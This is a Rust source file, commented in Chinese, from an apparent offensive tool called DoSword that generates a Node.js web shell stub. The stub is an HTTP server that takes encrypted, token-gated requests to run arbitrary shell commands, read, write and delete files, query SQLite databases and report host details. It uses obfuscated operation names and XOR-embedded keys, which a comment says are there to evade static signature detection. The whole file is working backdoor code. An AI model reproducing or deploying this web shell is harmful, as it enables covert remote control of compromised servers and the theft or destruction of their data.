//! Node.js stub 模板（NativeEncoder 的 node 分支）。
//! 载荷协议与 PHP native / JSP 完全一致：XOR 加密 + md5 哈希分发
//! + formData 参数 + X-Debug-Key 头鉴权（独立 HTTP 服务）。

/// Node.js stub：独立 HTTP 服务（默认 8000 端口），命令 / 文件 / 探测，无 DB。
#[allow(clippy::too_many_arguments)]
pub fn node_stub(
    xk: &str,
    gk_hex: &str,
    token_hex: &str,
    key_hex: &str,
    h_probe: &str,
    h_exec: &str,
    h_list: &str,
    h_read: &str,
    h_write: &str,
    h_delete: &str,
    h_rename: &str,
    h_mkdir: &str,
    h_touch: &str,
    h_dbprobe: &str,
    h_dbquery: &str,
    aead_ikm: Option<&str>,
) -> String {
    let (codec_helpers, codec_decode, codec_encode) = match aead_ikm {
        Some(ikm) => (
            r#"const IKM = Buffer.from(dec('{IKMX}', '{AXK}'), 'hex');
const AKEY = Buffer.from(crypto.hkdfSync('sha256', IKM, Buffer.from('dosword/aead/v2'), Buffer.from('dsw2'), 32));
const A_SEEN = new Map();
function aeadOpen(b64) {
  const f = Buffer.from(b64 || '', 'base64');
  if (f.length < 36) throw new Error('bad frame');
  const nonce = f.subarray(0, 12), sb = f.subarray(12, 20), rest = f.subarray(20);
  const seq = sb.readBigUInt64BE(0);
  const sid = nonce.subarray(0, 8).toString('hex');
  const last = A_SEEN.get(sid);
  if (last !== undefined && seq <= last) throw new Error('replay');
  const d = crypto.createDecipheriv('aes-256-gcm', AKEY, nonce);
  d.setAAD(Buffer.concat([Buffer.from('dsw2'), Buffer.from([1]), sb]));
  d.setAuthTag(rest.subarray(rest.length - 16));
  const plain = Buffer.concat([d.update(rest.subarray(0, rest.length - 16)), d.final()]);
  A_SEEN.set(sid, seq);
  if (A_SEEN.size > 512) A_SEEN.clear();
  return plain;
}
function aeadSeal(data) {
  const nonce = crypto.randomBytes(12);
  const seq = process.hrtime.bigint();
  const sb = Buffer.alloc(8); sb.writeBigUInt64BE(seq);
  const c = crypto.createCipheriv('aes-256-gcm', AKEY, nonce);
  c.setAAD(Buffer.concat([Buffer.from('dsw2'), Buffer.from([2]), sb]));
  const ct = Buffer.concat([c.update(data), c.final()]);
  return Buffer.concat([nonce, sb, ct, c.getAuthTag()]).toString('base64');
}"#
            // IKM（= SHA256(密码) 的十六进制）以 XOR 形式嵌入：避免静态特征直接命中
            .replace("{IKMX}", &crate::encoder::xor_hex(ikm, xk))
            .replace("{AXK}", xk)
            .to_string(),
            "aeadOpen(form.get('formData')).toString()".to_string(),
            "aeadSeal(Buffer.from(JSON.stringify(out)))".to_string(),
        ),
        None => (
            format!(
                "const KEY = Buffer.from(dec('{key_hex}', '{xk}'), 'utf8');\nfunction x(d) {{ const b = Buffer.isBuffer(d) ? d : Buffer.from(d); return Buffer.from(b.map((v, i) => v ^ KEY[i % KEY.length])); }}",
                key_hex = key_hex,
                xk = xk
            ),
            "x(Buffer.from(form.get('formData'), 'base64')).toString()".to_string(),
            "x(Buffer.from(JSON.stringify(out))).toString('base64')".to_string(),
        ),
    };
    format!(
        r#"// DoSword generated stub (node, xor)
const http = require('http');
const crypto = require('crypto');
const {{ exec }} = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

function dec(hexstr, k) {{ let out = ''; for (let i = 0; i < hexstr.length; i += 2) out += String.fromCharCode(parseInt(hexstr.substr(i, 2), 16) ^ k.charCodeAt((i / 2) % k.length)); return out; }}
{codec_helpers}
function h(op) {{ return parseInt(crypto.createHash('md5').update(op).digest('hex').slice(0, 8), 16).toString(); }}
const H = {{ probe: '{h_probe}', exec: '{h_exec}', list: '{h_list}', read: '{h_read}', write: '{h_write}', delete: '{h_delete}', rename: '{h_rename}', mkdir: '{h_mkdir}', touch: '{h_touch}', dbprobe: '{h_dbprobe}', dbquery: '{h_dbquery}' }};

const PORT = Number(process.env.PORT || 8000);
http.createServer((req, res) => {{
  let body = '';
  req.on('data', (c) => (body += c));
  req.on('end', () => {{
    let out = {{ ok: true, data: {{}} }};
    try {{
      const form = new URLSearchParams(body);
      const reqObj = JSON.parse({codec_decode});
      // S12：请求体内嵌 token 必须匹配（缺失或不匹配即 404）
      if (reqObj.token !== dec('{token_hex}', '{xk}')) {{ res.writeHead(404); res.end(); return; }}
      const a = reqObj.a || '';
      const hh = h(a);
      if (hh === H.probe) {{
        out.data = {{
          server: os.type() + ' ' + os.release() + ' ' + os.arch(),
          web_server: 'node',
          php_version: 'Node ' + process.version,
          current_dir: process.cwd(),
          separator: path.sep,
          php_sapi: 'node-http',
          arch: os.arch(),
          extensions: [],
          disable_functions: '',
          info: {{ ProtoVersion: '2', Capabilities: 'chunked,stream,db,plugin,exec', ShellType: 'file', OsInfo: os.type() + ' ' + os.release() + ' ' + os.arch(), CurrentUser: os.userInfo().username, CurrentDir: process.cwd(), FileRoot: __dirname, Node: process.version, Platform: os.platform() }},
        }};
      }} else if (hh === H.exec) {{
        const c = reqObj.c || ''; const w = reqObj.w || '';
        if (w && fs.existsSync(w)) process.chdir(w);
        if (c.startsWith('cd ')) {{
          const d = c.slice(3).trim().replace(/^["']|["']$/g, '');
          if (d) process.chdir(d);
          out.data = {{ stdout: '', cwd: process.cwd() }};
        }} else {{
          exec(c + ' 2>&1', {{ encoding: 'buffer' }}, (err, stdout) => {{
            out.data = {{ stdout: stdout.toString('base64'), cwd: process.cwd() }};
            res.end(JSON.stringify({{ data: {codec_encode}, code: 200 }}));
          }});
          return;
        }}
      }} else if (hh === H.list) {{
        const p = reqObj.p || '.';
        out.data = {{ entries: fs.readdirSync(p).sort().map((f) => {{ const fp = path.join(p, f); const st = fs.statSync(fp); return {{ name: f, path: fp, is_dir: st.isDirectory(), size: st.isFile() ? st.size : 0, mtime: Math.floor(st.mtimeMs / 1000), perms: (st.mode & 0o777).toString(8) }}; }}) }};
      }} else if (hh === H.read) {{
        const o = Number(reqObj.o) || 0;
        const l = Number(reqObj.l) || 0;
        if (l > 0) {{
          const fd = fs.openSync(reqObj.p || '', 'r');
          const buf = Buffer.alloc(l);
          const n = fs.readSync(fd, buf, 0, l, o);
          fs.closeSync(fd);
          out.data = buf.slice(0, n).toString('base64');
        }} else {{
          out.data = fs.readFileSync(reqObj.p || '').toString('base64');
        }}
      }} else if (hh === H.write) {{
        const o = Number(reqObj.o) || 0;
        const data = Buffer.from(reqObj.d || '', 'base64');
        if (o > 0) {{
          const fd = fs.openSync(reqObj.p || '', 'r+');
          fs.writeSync(fd, data, 0, data.length, o);
          fs.closeSync(fd);
        }} else {{
          fs.writeFileSync(reqObj.p || '', data);
        }}
      }} else if (hh === H.delete) {{
        fs.rmSync(reqObj.p || '', {{ recursive: true, force: true }});
      }} else if (hh === H.rename) {{
        fs.renameSync(reqObj.f || '', reqObj.t || '');
      }} else if (hh === H.mkdir) {{
        fs.mkdirSync(reqObj.p || '', {{ recursive: true }});
      }} else if (hh === H.touch) {{
        const t = Number(reqObj.t) || Math.floor(Date.now() / 1000);
        fs.utimesSync(reqObj.p || '', t, t);
      }} else if (hh === H.dbprobe) {{
        const c = JSON.parse(reqObj.c || '{{}}');
        if (c.driver === 'sqlite') {{
          const {{ DatabaseSync }} = require('node:sqlite');
          const db = new DatabaseSync(c.dbname || ':memory:');
          const rows = db.prepare("SELECT name FROM sqlite_master WHERE type='table' UNION SELECT 'main'").all();
          out.data = {{ databases: rows.map((r) => r.name) }};
          db.close();
        }} else {{
          out = {{ ok: false, error: 'unsupported driver ' + c.driver }};
        }}
      }} else if (hh === H.dbquery) {{
        const c = JSON.parse(reqObj.c || '{{}}');
        const q = reqObj.q || '';
        if (c.driver !== 'sqlite') {{
          out = {{ ok: false, error: 'dbquery 仅支持 sqlite（Node 端）' }};
        }} else {{
          const {{ DatabaseSync }} = require('node:sqlite');
          const db = new DatabaseSync(c.dbname || ':memory:');
          try {{
            const upper = q.trim().toUpperCase();
            if (upper.startsWith('SELECT') || upper.startsWith('PRAGMA') || upper.startsWith('SHOW') || upper.startsWith('WITH')) {{
              const stmt = db.prepare(q);
              const cols = stmt.columns().map((x) => x.name);
              const rows = stmt.all().map((r) => cols.map((cn) => (r[cn] === null || r[cn] === undefined ? null : String(r[cn]))));
              out.data = {{ columns: cols, rows, affected: 0 }};
            }} else {{
              const info = db.prepare(q).run();
              out.data = {{ columns: [], rows: [], affected: Number(info.changes) }};
            }}
          }} catch (qe) {{
            out = {{ ok: false, error: String(qe && qe.message ? qe.message : qe) }};
          }}
          db.close();
        }}
      }}
    }} catch (e) {{
      out = {{ ok: false, error: String(e && e.message ? e.message : e) }};
    }}
    res.end(JSON.stringify({{ data: {codec_encode}, code: 200 }}));
  }});
}}).listen(PORT, '0.0.0.0', () => console.log('DoSword node stub listening on ' + PORT));
"#,
        h_probe = h_probe,
        h_exec = h_exec,
        h_list = h_list,
        h_read = h_read,
        h_write = h_write,
        h_delete = h_delete,
        h_rename = h_rename,
        h_mkdir = h_mkdir,
        h_touch = h_touch,
        h_dbprobe = h_dbprobe,
        h_dbquery = h_dbquery,
        codec_helpers = codec_helpers,
        codec_decode = codec_decode,
        codec_encode = codec_encode,
    )
    .replace("{xk}", xk)
    .replace("{gk_hex}", gk_hex)
    .replace("{token_hex}", token_hex)
}
